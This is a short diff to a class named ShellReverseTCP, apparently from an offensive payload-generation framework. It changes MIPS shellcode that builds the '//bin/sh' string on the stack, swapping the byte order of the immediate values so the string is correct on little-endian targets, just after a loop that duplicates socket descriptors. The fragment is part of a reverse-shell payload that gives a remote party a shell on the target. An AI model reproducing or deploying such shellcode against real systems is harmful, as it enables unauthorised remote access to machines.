@@ -85,11 +85,11 @@ class ShellReverseTCP(HatAsm, HatVenom, Words):
             bne $s1, $s0, dup
 
             slti $a2, $zero, -1
-            lui $t7, 0x2f2f
-            ori $t7, $t7, 0x6269
+            lui $t7, 0x6962
+            ori $t7, $t7, 0x2f2f
             sw $t7, -0x14($sp)
-            lui $t6, 0x6e2f
-            ori $t6, $t6, 0x7368
+            lui $t6, 0x6873
+            ori $t6, $t6, 0x2f6e
             sw $t6, -0x10($sp)
             sw $zero, -0xc($sp)
             addiu $a0, $sp, -0x14
